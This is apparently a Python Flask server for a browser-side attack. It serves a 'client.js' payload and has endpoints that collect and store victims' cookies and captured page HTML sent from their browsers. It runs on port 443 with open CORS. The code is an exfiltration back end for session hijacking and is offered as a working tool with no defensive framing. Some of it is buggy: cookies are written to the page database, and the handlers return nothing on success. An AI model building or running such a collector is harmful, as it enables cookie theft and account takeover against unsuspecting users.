from flask import Flask, request, send_file
from db import sqlDB
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

html_pages = sqlDB('html_pages.db')
cookies = sqlDB('cookies.db')
html_pages.create_db()
cookies.create_db()

@app.route ('/client.js', methods=['GET'])
def clientjs():
	print("[+] Sending Payload")
	return send_file('./client.js', download_name='client.js')

@app.route ('/save_page', methods=['POST'])
def save_page():
	if 'url' not in request.form.keys() or 'content' not in request.form.keys():
		return "Invalid save page request", 400
	url = request.form['url']
	content = request.form['content']
	html_pages.insert_content((url, content))

@app.route ('/save_cookie', methods=['POST'])
def save_cookie():
	if 'name' not in request.form.keys() or 'value' not in request.form.keys():
		return "Invalid save cookie request", 400
	name = request.form['name']
	value = request.form['value']
	html_pages.insert_content((name, value))

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
